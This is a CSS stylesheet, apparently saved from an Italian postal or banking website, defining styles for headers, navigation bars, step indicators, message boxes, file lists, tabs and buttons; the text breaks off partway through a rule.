.submenu-need .submenu-need-scroller .scroller-need-risparmiare:hover a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-bisogni-bluedouble/ico-risparmio-postale-risparmiare-investire.png*/ url();
}


/***************************/

/******* Header *******/

/***************************/

.content-federation-bar-fixed {
    top: 0 !important;
    display: block !important;
}

.content-federation-bar-minified,
.content-federation-bar-simplified {
    width: 100%;
    z-index: 1039;
    top: -49px;
    -webkit-transition: all 0.2s linear;
    -o-transition: all 0.2s linear;
    -moz-transition: all 0.2s linear;
    -ms-transition: all 0.2s linear;
    -kthtml-transition: all 0.2s linear;
    transition: all 0.2s linear;
    background-color: #eedc00 !important;
    height: 49px;
    line-height: 49px;
    position: fixed;
    /*top: 0;
    left: 0;
    width: 100%;*/
}


/*
.content-federation-bar-minified .logo,
.content-federation-bar-simplified .logo {
    height: 49px;
    line-height: 54px;
}
*/

.content-federation-bar-minified .federation-bar-wrap ul.dropdown-menu-federation,
.content-federation-bar-simplified .federation-bar-wrap ul.dropdown-menu-federation {
    line-height: normal;
}

.content-federation-bar-minified {
    top: -49px;
}

.content-federation-bar-simplified {
    top: 0px;
}

.content-federation-bar-minified .back-link {
    display: none;
}

.content-federation-bar-simplified .back-link {
    display: block;
}

.content-federation-bar-minified .federation-bar-content-logo div,
.content-federation-bar-simplified .federation-bar-content-logo div {
    float: left;
    /*padding: 2px 0 0 0;*/
}

.content-federation-bar-minified .header-minified .content-federation-bar .federation-bar-wrap,
.content-federation-bar-simplified .header-simplified .content-federation-bar .federation-bar-wrap {
    min-height: inherit;
}

.content-federation-bar-minified .federation-bar-wrap ul.dropdown-menu-federation,
.content-federation-bar-simplified .federation-bar-wrap ul.dropdown-menu-federation {
    top: 58px;
}

.content-federation-bar-minified .header-minified .logo a img,
.content-federation-bar-simplified .header-simplified .logo a img {
    vertical-align: baseline;
}

.content-federation-bar-minified .federation-bar-wrap a.pi-targetarea,
.content-federation-bar-simplified .federation-bar-wrap a.pi-targetarea {
    display: inline-table;
    height: auto;
    vertical-align: inherit;
}

.content-federation-bar-minified .header-minified a:hover,
.content-federation-bar-minified .header-minified a:focus,
.content-federation-bar-simplified .header-simplified a:hover,
.content-federation-bar-simplified .header-simplified a:focus {
    color: #0047bb !important;
    text-decoration: none;
}

.content-federation-bar-minified .notifications,
.content-federation-bar-simplified .notifications {
    background-color: #CE0B24;
    display: block;
    height: 8px;
    left: 10px;
    position: absolute;
    top: 14px;
    width: 8px;
    border-radius: 5px;
}

.content-federation-bar-minified .header-minified .back a,
.content-federation-bar-simplified .header-simplified .back a,
.content-abstract .back a{
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on/ico-torna-indietro.png*/ url();
    background-size: 20px;
    background-repeat: no-repeat;
    background-position: left center;
    padding: 0 0 0 26px;
    color: #222427;
    font-size: 14px;
    text-transform: uppercase;
    font-weight: 600;
}

.content-header-federation-bar-fixed {
    position: fixed;
    width: 100%;
    z-index: 1045;
    top: -200px;
}

.wrap-logo {
    position: relative;
}


/***************************/

/******* Abstract *******/

/***************************/

.content-abstract {
    padding: 50px 0 10px;
}

.content-abstract .abstract {
    padding: 20px 0px 50px;
}

.content-abstract .abstract h1 {
    margin-top: 0;
}

.abstract-picture {
    position: relative;
}

.abstract-picture-box {
    background-color: #fff;
    border: 1px solid #ececec;
    display: inline-block;
    -webkit-box-shadow: 0px 0px 10px 0 rgba(0, 0, 0, 0.1);
    -moz-box-shadow: 0px 0px 10px 0 rgba(0, 0, 0, 0.1);
    box-shadow: 0px 0px 10px 0 rgba(0, 0, 0, 0.1);
}

.abstract-picture-wrap {
    min-height: 150px;
    margin-bottom: 40px;
}

.abstract-picture-box .abstract-picture-wrap {
    min-height: auto;
    margin-bottom: 0px;
}

.abstract-picture-wrap img {
    position: absolute;
    top: 0;
    left: 0;
    bottom: 0;
    right: 0;
    margin: auto;
}

.abstract-picture-box .abstract-picture-wrap img {
    position: static;
}

.abstract-picture-desc {
    font-size: 19px;
    font-weight: 600;
    color: #4a4a4a;
}

.avatar img {
    width: 100px;
    height: 100px;
    border-radius: 50px;
}

.content-abstract .welcome .abstract {
    padding: 0px 0px 10px;
}

.welcome .abstract h1 {
    margin: 0px 0px 10px 0px;
    font-size: 40px;
    letter-spacing: 0;
}

.welcome .abstract h1 span {
    display: block;
    font-size: 55px;
    font-weight: 600;
}


/***************************/

/******* Pre Main Content *******/

/***************************/

.content-pre-main {
    padding: 0;
}

.content-page-anchors {
    border-bottom: 1px solid #f6f6f6;
}

.content-page-anchors-fixed {
    position: fixed;
    top: 0;
    width: 100%;
    z-index: 10;
    background-color: #f6f6f6;
    border-bottom-color: #ececec;
}

.content-pre-main ul#anchor-submenu {
    margin: 0;
}

.content-pre-main ul#anchor-submenu li {
    margin-right: 20px;
    text-transform: uppercase;
    line-height: 50px
}

.content-pre-main ul#anchor-submenu li a {
    color: #222427;
    display: block;
    /*border-bottom: 3px solid transparent;*/
}

.content-pre-main ul#anchor-submenu li a:hover {
    text-decoration: none;
    color: #0047bb;
}

.content-pre-main ul#anchor-submenu li a:after {
    content: '';
    display: block;
    height: 3px;
    width: 0;
    background: transparent;
    transition: width .5s ease, background-color .5s ease;
    margin: 0 0 0;
}

.content-page-anchors-fixed ul#anchor-submenu li {}

.content-page-anchors-fixed ul#anchor-submenu li a:after {
    /* margin: -5px 0 0;*/
}

.content-pre-main ul#anchor-submenu li a.active {
    color: #0047bb;
}

.content-pre-main ul#anchor-submenu li a.active:after {
    width: 100%;
    background: #0047bb;
}


/* width e display:table sono x chrome */

.segments {
    margin: 10px 0 20px;
    padding: 0;
    background-color: #fff;
    list-style: outside none none;
    border: 1px solid #0047bb;
    -webkit-border-radius: 20px;
    -moz-border-radius: 20px;
    -ms-border-radius: 20px;
    border-radius: 20px;
    line-height: 28px;
    font-weight: 400;
    min-height: 30px;
    width: 100%;
    display: table;
}

.segments > li {
    display: table-cell;
    float: none;
    text-align: center;
    min-width: 1%;
    height: 28px;
}

.segments > li:first-child .segment-content {
    -webkit-border-radius: 20px 0px 0px 20px;
    -moz-border-radius: 20px 0px 0px 20px;
    -ms-border-radius: 20px 0px 0px 20px;
    border-radius: 20px 0px 0px 20px;
    margin-left: -1px;
}

.segments > li:last-child .segment-content {
    -webkit-border-radius: 0px 20px 20px 0px;
    -moz-border-radius: 0px 20px 20px 0px;
    -ms-border-radius: 0px 20px 20px 0px;
    border-radius: 0px 20px 20px 0px;
    margin-right: -1px;
}

.segments > li .segment-content {
    display: block;
    height: 100%;
    white-space: nowrap;
}

.segments > li.active .segment-content {
    display: block;
    height: 100%;
    background-color: #0047bb;
    color: #fff;
}

.segments.segments-2 > li {
    width: 50%;
}

.segments.segments-3 > li {
    width: 33.333%;
}

.segments.segments-4 > li {
    width: 25%;
}

.segments.segments-5 > li {
    width: 20%;
}

.segments.segments-6 > li {
    width: 16.6%;
}


/*steps*/

.steps {
    border: none;
    padding: 20px 0;
    margin: 0;
}

.steps > li {
    display: block;
    float: left;
    padding-right: 25px;
    margin-right: 10px;
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/line-bg.png*/ url();
    background-position: right 0px bottom 8px;
    background-repeat: no-repeat;
}

.steps > li a {
    display: block;
    height: 100%;
    width: 100%;
}

.steps > li:last-child {
    background-image: none;
}

.steps > li .step-content span.step-desc {
    display: block;
    background: #fff;
    padding-right: 10px;
}

.steps > li .step-content span.step-number {
    background-color: transparent;
    color: #fff;
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/list-step.png*/ url();
    background-repeat: no-repeat;
    background-position: center;
    background-size: 24px;
    padding: 4px 8px;
    width: 24px;
    text-align: center;
    display: inline-block;
}

.steps > li.active .step-content {
    background-color: #fff;
}

.steps > li.active .step-content span.step-number,
.steps > li.passed .step-content span.step-number {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/list-step-active.png*/ url();
}

.steps > li.active .step-content span.step-desc {
    color: #0047bb;
}

.steps > li.passed .step-content span.step-desc {
    color: #222427;
}


/* Steps inside page content ('column' division) */

.steps.steps-internal {
    margin-left: -15px;
    margin-right: -15px;
}

.steps.steps-internal > li {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/steps-internal.png*/ url();
    background-repeat: no-repeat;
    background-position: top 40px right 3px;
    margin-right: 0;
    padding-right: 15px;
}

.steps.steps-internal > li .step-content span.step-desc {
    margin-right: 15px;
}

.steps.steps-internal > li .step-content span.step-desc,
.steps.steps-internal > li.active .step-content {
    background-color: transparent;
}

.steps.steps-internal > li:last-child {
    background-image: none;
}


/***************************/

/******* Main Content *******/

/***************************/

.main-pills,
.main-messages,
.main-result {
    margin-bottom: 40px;
}

.main-messages {
    background-color: #ececec;
    border-width: 0px 1px 0px 10px;
    border-style: solid;
    border-color: transparent;
}

.main-messages .main-messages-wrap {
    padding: 40px 40px 40px 55px;
    margin-left: 30px;
    background-repeat: no-repeat;
    background-position: 0px 42px;
    background-size: 40px;
}

.main-messages .main-messages-wrap .messages-heading p {
    margin: 0;
}

.main-messages-info .main-messages-wrap {
    background-image: url(/risorse_dt/condivise/immagini/icone/ico-messages-info.png);
}

.main-messages-warning .main-messages-wrap {
    background-image: url(/risorse_dt/condivise/immagini/icone/ico-messages-warning.png);
}

.main-messages-error .main-messages-wrap {
    background-image: url(/risorse_dt/condivise/immagini/icone/ico-messages-error.png);
}

.main-messages-success .main-messages-wrap {
    background-image: url(/risorse_dt/condivise/immagini/icone/ico-messages-success.png);
}

.main-messages-info {
    border-left-color: #0047bb;
}

.main-messages-warning {
    border-left-color: #ffb906;
}

.main-messages-error {
    border-left-color: #ff3636;
}

.main-messages-success {
    border-left-color: #26b158;
}

.main-result {
    text-align: center;
}

.main-result .main-result-wrap .result-heading {
    background-repeat: no-repeat;
    background-position: center bottom;
    min-height: 140px;
    padding-bottom: 90px;
    margin-bottom: 30px;
    background-size: 70px;
}

.main-result-success .main-result-wrap .result-heading {
    background-image: url(/risorse_dt/condivise/immagini/icone/ico-result-success.png);
}

.main-result-error .main-result-wrap .result-heading {
    background-image: url(/risorse_dt/condivise/immagini/icone/ico-result-error.png);
}

.main-pills {
    background-color: #fff;
    border: 1px solid #ececec;
}

.main-pills.main-pills-basic {
    background-color: transparent;
    border: none;
    padding: 0px;
}

.main-pills-basic.border-xs-top,
.main-pills-basic.border-sm-top,
.main-pills-basic.border-md-top,
.main-pills-basic.border-lg-top,
.main-pills-basic.border-xs-bottom,
.main-pills-basic.border-sm-bottom,
.main-pills-basic.border-md-bottom,
.main-pills-basic.border-lg-bottom {
    border-bottom-color: #ccc !important;
}

.main-pills.main-pills-evidence{
  background-color: #f9f9f9;
}

.main-pills.main-pills-bg-pattern {
    background-color: #fff;
}

.main-pills.main-pills-bg-pattern-01 {
    background-image: url(/risorse_dt/condivise/immagini/generiche/chart-bg-01.png);
    background-position: bottom center;
    background-repeat: repeat-x;
    background-size: auto 65px;
    animation: animatedBackgroundPatternX 20s linear infinite;
}

.main-pills.main-pills-bg-pattern-02 .h1 {
    position: relative;
    margin-bottom: 18px;
    padding-bottom: 10px;
}

.main-pills.main-pills-bg-pattern-02 .h1:after {
    display: block;
    width: 25%;
    height: 2px;
    content: "";
    background-color: #0047bb;
    position: absolute;
    bottom: 0;
    left: 0;
    right: 0;
    margin: 0 auto;
}

.main-pills .main-pills-wrap {
    padding: 40px;
    background-position: right;
    background-repeat: no-repeat;
}

.main-pills.main-pills-bg-inverse .main-pills-wrap{
    background-position: left;
}

.main-pills .main-pills-wrap .scroll-content {
    overflow-y: auto;
    height: 392px;
}

.main-pills .main-pills-wrap .scroll-content.scroll-content-pre-btn {
    height: 330px;
    margin-bottom: 20px;
}

.main-pills .main-pills-wrap-left {
    padding-right: 10px;
}

.main-pills .main-pills-wrap-right {
    padding-left: 10px;
}

.main-pills h2,
.main-pills .h2 {
    color: #222427;
    font-size: 36px;
    font-weight: 500;
}


/*
.box-editable-area a{
    position: relative;
}
.box-editable-area a:hover{
    text-decoration: none;
}
.box-editable-area a:after {
    content: "";
    width: 0;
    background-color: transparent;
    height: 1px;
    display:inline-block;
    position: absolute;
    left: 0;
    bottom: 0;
    -webkit-transition: all 0.2s linear;
    -o-transition: all 0.2s linear;
    -moz-transition: all 0.2s linear;
    -ms-transition: all 0.2s linear;
    -kthtml-transition: all 0.2s linear;
    transition: all 0.2s linear;
}
.box-editable-area a:hover:after {
    content: "";
    width: 100%;
    background-color: #0047bb;
}
*/

.box-sheet {
    background-color: #fff;
    padding: 40px;
}

.box-sheet::before {
    border-color: #ececec #ececec #ccc #ccc;
    border-style: solid;
    border-width: 30px;
    top: 0px;
    content: "";
    display: inline-block;
    right: 0px;
    position: absolute;
    /*transform: translateX(-50%);*/
}

.main-pills.main-pills-basic h2 {
    color: #0047bb;
    font-size: 44px;
    font-weight: 300;
}

.box-editable-spacing,
.main-pills {
    margin-bottom: 40px;
}

.content-post-main .main-pills {
    margin-bottom: 40px;
}

.content-main .container .main-pills:last-child,
.content-post-main .main-pills:last-child {
    margin-bottom: 0px;
}

.wizard-card {
    background-position: top left;
    background-repeat: no-repeat;
    background-size: 80px;
    padding-left: 100px;
    margin-bottom: 40px;
}

.wizard-card-last {
    margin-bottom: 0;
}

.wizard-card .wizard-card-inner {
    display: table-cell;
    vertical-align: middle;
    height: 80px;
}

.wizard-card .wizard-card-inner-top {
    vertical-align: top;
}

.wizard-card .wizard-card-inner-middle {
    vertical-align: middle;
}

.wizard-arrow {
    position: absolute;
    top: 30px;
    right: -6px;
}

.applfunction > a {
    display: inline-block;
    height: 28px;
    width: 28px;
    background-position: center;
    background-repeat: no-repeat;
    background-size: 24px;
    text-indent: -9999px;
    text-align: left;
    margin-left: 5px;
}

.applfunction.applfunction-download > a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on/ico-downloadpay.png*/ url();
}

.applfunction.applfunction-print > a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on/ico-stampa.png*/ url();
}

.applfunction.applfunction-delete > a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on/ico-cestino.png*/ url();
}

.applfunction.applfunction-share > a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on/ico-share.png*/ url();
}

.applfunction.applfunction-link > a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on/ico-ancora.png*/ url();
}

.applfunction.applfunction-visualizza > a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on/ico-documento-generico.png*/ url();
}

.applfunction.applfunction-file-pdf > a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on/list-file-pdf.png*/ url();
}

.applfunction.applfunction-file-zip > a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on/list-file-zip.png*/ url();
}

.applfunction.applfunction-file-xls > a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on/list-file-xls.png*/ url();
}

.applfunction.applfunction-file-doc > a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on/list-file-doc.png*/ url();
}

.applfunction.applfunction-file-img > a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on/list-file-img.png*/ url();
}

.applfunction.applfunction-file-img > a {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on/list-file-ppt.png*/ url();
}


/* Liste */

.list-inside {
    list-style-position: inside;
}

.list-check {
    list-style: none;
    padding: 0;
}

.list-check li {
    padding: 0 0 0 30px;
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/list-check.png*/ url();
    background-repeat: no-repeat;
    background-position: 5px 7px;
    background-size: 14px;
}

.list-segments {
    list-style: none;
    padding: 0;
}

.list-segments li {
    padding: 0 0 0 25px;
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-right.png*/ url();
    background-repeat: no-repeat;
    background-position: 6px 5px;
    background-size: 9px 14px;
}

.list-check-yellow li {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/list-check-yellow.png*/ url();
}

.list-file {
    padding: 0;
}

.list-file li {
    padding: 3px 0 3px 35px;
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on/list-file.png*/ url();
    background-repeat: no-repeat;
    background-position: left 2px;
    list-style: none;
    margin-bottom: 5px;
    background-size: 24px;
}

li.list-file-pdf {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on/list-file-pdf.png*/ url();
}

li.list-file-doc {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on/list-file-doc.png*/ url();
}

li.list-file-zip {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on/list-file-zip.png*/ url();
}

li.list-file-xls {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on/list-file-xls.png*/ url();
}

li.list-file-txt {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on/list-file-txt.png*/ url();
}

li.list-file-ppt {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on/list-file-ppt.png*/ url();
}

li.list-file-img {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on/list-file-img.png*/ url();
}

li.list-file-xml {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on/list-file-xml.png*/ url();
}

li.list-file-yt {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on/list-file-yt.png*/ url();
}

li.list-file-mp4 {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on/list-file-mp4.png*/ url();
}

li.list-file-link {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-list-file-on/list-file-link.png*/ url();
}

.list-file li .note {
    font-style: normal;
}

.list-file li a {
    color: #222427;
}

.list-file li a:hover {
    color: #0047bb;
    text-decoration: none;
}
.list-file-detailed li{
  background-position: left 10px;
  padding: 12px 0 12px 35px;
  margin-bottom: 2px;
  border-bottom: 1px solid #ececec;
}

.list-boxed li{
  padding: 20px 50px;
  border: 1px solid #ccc;
  background-position: left 20px top 20px;
  margin-bottom: 15px;
  position: relative;
}

.list-boxed span[name="trim"] {
    display: inline-block;
    padding: 0;
    vertical-align: middle;
    max-width: calc(100% - 30px);
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
}

.list-boxed span.applfunction{
  position: absolute;
  top: 18px;
  right: 20px;
}

.list-boxed span.applfunction a{
  background-size: 22px;
}

.main-pills .list-inside li {
    padding-bottom: 30px
}

.list-spaced li {
    padding-bottom: 10px
}

.list-services {
    margin-top: 0px;
}

.list-services li {
    padding-bottom: 7px;
    padding-top: 7px
}

.list-services li.divider {
    padding-bottom: 0px;
    padding-top: 0px
}

.list-services li a {
    padding-bottom: 6px;
    text-transform: uppercase;
    color: #222427;
    font-size: 15px;
}

.list-services li a:hover {
    color: #0047bb;
    text-decoration: none;
}

.list-services li:last-child,
.list-spaced li:last-child {
    padding-bottom: 0;
}

a.link-icon {
    font-size: 16px;
    text-transform: uppercase;
    background-repeat: no-repeat;
    background-position: center left;
    background-size: 21px;
    padding-left: 30px;
    color: #222427;
}

a.link-icon:hover {
    color: #0047bb;
    text-decoration: none;
}

.list-color li {
    padding-left: 15px;
    position: relative;
}

.list-color li:before {
    content: ' ';
    display: block;
    width: 10px;
    height: 10px;
    background-color: #ccc;
    left: 0px;
    top: 6px;
    position: absolute;
}

.list-color.small li:before {
    top: 4px;
}

li.list-color-red:before {
    background-color: #ff3636;
}

li.list-color-green:before {
    background-color: #26b158;
}

li.list-color-yellow:before {
    background-color: #eedc00;
}

li.list-color-orange:before {
    background-color: #ffb906;
}

li.list-color-grey1:before {
    background-color: #666666;
}

li.list-color-grey2:before {
    background-color: #ededed;
}

li.list-color-grey3:before {
    background-color: #ccc;
}

li.list-color-brown:before {
    background-color: #c08048;
}

li.list-color-aqua:before {
    background-color: #28beaf;
}

li.list-color-violet:before {
    background-color: #bb76e3;
}

li.list-color-coral:before {
    background-color: #d46868;
}

li.list-color-cyan:before {
    background-color: #34b9e2;
}


/* Liste su cui utilizzare incolonnamenti */

.list-tailback {
    list-style: none;
    padding: 0;
    margin-left: -15px;
    margin-right: -15px;
}

.list-tailback::before,
.list-tailback::after {
    content: " ";
    display: table;
}

.list-tailback::after {
    clear: both;
}

.usefull-link .list-tailback li {
    margin-bottom: 8px;
}

.list-color.list-tailback li {
    padding-left: 30px;
    position: relative;
}

.list-color.list-tailback li:before {
    left: 15px;
}

/* Liste inline con bordo sx */
.list-bordered{
   padding: 0;
}
.list-bordered li{
   display: inline-block;
   list-style: none;
   border-left: 1px solid #ccc;
   padding: 0 8px;
   float: left;
}
.list-bordered li:first-child{
   padding-left: 0;
   border-left: none;
}

/* Spalla */

#bracket {
    margin-left: 0px;
}

#bracket .bracket-pills {
    padding-bottom: 15px;
    margin-bottom: 15px;
}

#bracket .bracket-pills.border-xs-bottom,
#bracket .bracket-pills.border-sm-bottom,
#bracket .bracket-pills.border-md-bottom,
#bracket .bracket-pills.border-lg-bottom {
    padding-bottom: 30px;
    margin-bottom: 30px;
    border-color: #ccc !important;
}

#bracket .bracket-pills a {
    font-weight: 300;
}

#bracket .bracket-pills li {
    margin-bottom: 8px;
}

#bracket .bracket-pills h5 {
    color: #222427;
    font-weight: 600;
    margin-bottom: 20px;
}

#bracket .bracket-pills .panel-cards {
    margin-bottom: 0;
}



/***************************/

/******* Tabs verticali destra e sinistra *******/

/***************************/

.vertical-nav-tabs {
    border-bottom: none;
    padding-top: 0px;
    position: relative;
    z-index: 2;
}

.vertical-nav-tabs-left {
    margin-right: -21px;
}

.vertical-nav-tabs-right {
    margin-left: -21px;
}

.vertical-nav-tabs > li {
    float: none;
    margin-bottom: -1px;
}

.vertical-nav-tabs > li:last-child {
    margin-bottom: 0px;
}

.vertical-nav-tabs-left > li {
    margin-right: -1px;
}

.vertical-nav-tabs-right > li {
    margin-left: -1px;
}

.vertical-nav-tabs > li:hover {
    cursor: pointer;
}

.vertical-nav-tabs > li > a {
    padding: 0;
    outline: none;
    color: #222427;
    -webkit-border-radius: 0px;
    -moz-border-radius: 0px;
    -ms-border-radius: 0px;
    border-radius: 0px;
    display: block;
}

.vertical-nav-tabs > li > a:focus {
    outline: none;
}

.vertical-nav-tabs-left > li > a {
    border-width: 0px 0px 0px 4px;
    border-color: #fff;
    border-bottom-style: solid;
    border-left-color: #fff;
    margin-right: 0;
}

.vertical-nav-tabs-right > li > a {
    border-width: 0px 4px 0px 0px;
    border-color: #fff;
    border-bottom-style: solid;
    border-right-color: #fff;
    margin-left: 0;
}

.vertical-nav-tabs > li > a:hover {
    border-bottom-color: transparent;
    background-color: transparent;
}

.vertical-nav-tabs-left > li > a:hover {
    border-left-color: #f0f0f0;
}

.vertical-nav-tabs-right > li > a:hover {
    border-right-color: #f0f0f0;
}

.vertical-nav-tabs > li > a span {
    display: block;
    /*line-height: 45px;*/
    padding: 1px 0;
    text-align: center;
    font-weight: 500;
    font-size: 16px;
    text-align: left;
    text-transform: uppercase;
    background-color: #fff;
}

.vertical-nav-tabs-left > li > a span {
    margin-right: 1px;
    padding: 10px 25px;
}

.vertical-nav-tabs-right > li > a span {
    margin-left: 1px;
    padding: 10px 25px;
}

.vertical-nav-tabs > li > a:hover span {
    background-color: #fff;
}

.vertical-nav-tabs > li.active > a span {
    background-color: #fff;
}

.vertical-nav-tabs > li.active > a,
.vertical-nav-tabs > li.active > a:hover,
.vertical-nav-tabs > li.active > a:focus {
    border-top: none;
    border-bottom: none;
    color: #0047bb;
}

.vertical-nav-tabs-left > li.active > a,
.vertical-nav-tabs-left > li.active > a:hover,
.vertical-nav-tabs-left > li.active > a:focus {
    border-right-color: transparent;
    border-left: 4px solid #0047bb;
}

.vertical-nav-tabs-right > li.active > a,
.vertical-nav-tabs-right > li.active > a:hover,
.vertical-nav-tabs-right > li.active > a:focus {
    border-left-color: transparent;
    border-right: 4px solid #0047bb;
}

.vertical-nav-tabs-left > li.active > a span,
.vertical-nav-tabs-left > li.active > a:hover span,
.vertical-nav-tabs-left > li.active > a:focus span {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-right.png*/ url();
    background-position: right 15px center;
    background-repeat: no-repeat;
    background-size: 9px 14px;
}

.vertical-nav-tabs-right > li.active > a span,
.vertical-nav-tabs-right > li.active > a:hover span,
.vertical-nav-tabs-right > li.active > a:focus span {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-left.png*/ url();
    background-position: left 15px center;
    background-repeat: no-repeat;
    background-size: 9px 14px;
}

.vertical-tab-content {
    min-height: 300px;
}

.vertical-tab-content-right .tab-pane-content {
    padding: 12px 20px 0px 20px;
}

.vertical-tab-content-left .tab-pane-content {
    padding: 12px 20px 0px 20px;
}

.vertical-tab-content .tab-pane-content .tab-title {
    margin-top: 0;
}


/***************************/

/******* Tabs orizzontali  *******/

/***************************/

.horizontal-nav-tabs {
    border-bottom: none;
}

.horizontal-nav-tabs > li > a {
    -webkit-border-radius: 0px;
    -moz-border-radius: 0px;
    border-radius: 0px;
    margin-right: 0px;
    padding: 10px 40px;
}

.horizontal-nav-tabs > li > a {
    color: #222427;
    text-transform: uppercase;
    font-size: 16px;
    line-height: 24px;
    font-weight: 600;
}

.horizontal-nav-tabs > li > a,
.horizontal-nav-tabs > li > a:hover,
.horizontal-nav-tabs > li > a:focus {
    background-color: #ececec;
    border-bottom: none;
}

.horizontal-nav-tabs > li.active > a {
    color: #222427;
}

.horizontal-nav-tabs > li.active > a,
.horizontal-nav-tabs > li.active > a:hover,
.horizontal-nav-tabs > li.active > a:focus {
    border-color: #ececec;
    border-bottom-color: transparent;
}


/* gestione badge */

.badge-app .playstore {
    height: 80px;
    width: 210px;
}

.badge-app .appstore {
    height: 80px;
    width: 210px;
}


/***************************/

/******* Form link, Bottoni e Cta *******/

/***************************/

/* cookie-link (like btn) */

.cookie-link {
    color: #0047bb !important;
    -webkit-border-radius: 30px;
    -moz-border-radius: 30px;
    border-radius: 30px;
    line-height: 44px;
    padding: 2px 25px;
    font-size: 18px;
    font-weight: 300 !important;
    margin-bottom: 15px;
}

.cookie-link-default {
    background-color: #fff;
    border-color: #ccc;
    color: #4a4a4a;
    white-space: nowrap;
    display: inline-block;
}

.cookie-link-default:hover,
.cookie-link-default:focus,
.cookie-link-default.active,
.cookie-link-default:active,
.cookie-link-default.focus {
    background-color: #fff !important;
    color: #00328e !important;
    box-shadow: none;
}


/* btn */

.btn-container {
    margin-top: 0px;
}

.btn-container-right .btn {
    float: right;
    margin-left: 20px;
}

.btn-container-left .btn {
    float: left;
    margin-right: 20px;
}

.btn-container-center {
    text-align: center;
}

.btn-container-center .btn {
    margin-right: 10px;
    margin-left: 10px;
}

.btn-container-right .btn:last-child {
    margin-left: 0;
}

.btn-container-left .btn:last-child,
.btn-container-center .btn:last-child {
    margin-right: 0;
}

.btn-container-center .btn:first-child {
    margin-left: 0;
}

.main-pills-wrap .btn-container-abs {
    position: absolute;
    bottom: -65px;
    left: 0;
    right: 0;
    margin: 0 auto;
}

.main-pills-wrap .btn-container-abs.btn-container-bottom {
    bottom: -65px;
}

.btn {
    color: #222427;
    -webkit-border-radius: 30px;
    -moz-border-radius: 30px;
    border-radius: 30px;
    line-height: 44px;
    padding: 2px 25px;
    font-size: 18px;
    font-weight: 600 !important;
    text-transform: uppercase;
    margin-bottom: 15px;
}

.btn-expand {
    width: 100%;
    /* truncate overflow text */
    overflow: hidden;
    text-overflow: ellipsis;
}

.btn-primary {
    background-color: #eedc00;
    border-color: #eedc00;
}

.btn-primary:hover,
.btn-primary:focus,
.btn-primary.active,
.btn-primary:active,
.btn-primary.focus {
    background-color: #ffec00 !important;
    border-color: transparent;
    color: inherit !important;
    box-shadow: none;
    outline: 0 none !important;
    border-color: #ffec00 !important;
}

.btn-secondary {
    background-color: transparent;
    border-color: #eedc00;
    color: #4a4a4a;
}

.btn-secondary:hover,
.btn-secondary:focus,
.btn-secondary.active,
.btn-secondary:active,
.btn-secondary.focus {
    background-color: #eedc00 !important;
    border-color: #eedc00;
    color: inherit !important;
    box-shadow: none;
    outline: 0 none !important;
}

.btn-default {
    background-color: #fff;
    border-color: #fff;
    color: #4a4a4a;
}

.btn-default:hover,
.btn-default:focus,
.btn-default.active,
.btn-default:active,
.btn-default.focus {
    background-color: #fff !important;
    color: #0047bb !important;
    box-shadow: none;
    border-color: #d9d9d9 !important;
}

.content-grey .btn-default:hover,
.content-color .btn-default:hover,
.content-bg .btn-default:hover,
.content-grey .btn-default:focus,
.content-color .btn-default:focus,
.content-bg .btn-default:focus,
.content-grey .btn-default:active,
.content-color .btn-default:active,
.content-bg .btn-default:active {
    border-color: #fff;
}

.btn-sm,
.btn-group-sm > .btn {
    padding: 2px 15px;
}

.btn-xs,
.btn-group-xs > .btn {
    padding: 0px 20px;
    font-size: 14px;
    line-height: 30px;
}


/* tag , filtri e elementi removibili/draggabili */

.tag {
    color: #222427;
    -webkit-border-radius: 30px;
    -moz-border-radius: 30px;
    border-radius: 30px;
    padding: 0px 20px;
    font-size: 14px;
    line-height: 30px;
    font-weight: 600 !important;
    text-transform: uppercase;
    margin-bottom: 5px;
    display: inline-block;
}

.tag-element {
    background-color: #ececec;
    padding-right: 60px;
    position: relative;
    margin-right: 6px;
}

.tag-element-heavenly {
    background-color: #d9e4f5;
    color: #0047bb;
}

.tag.tag-ico {
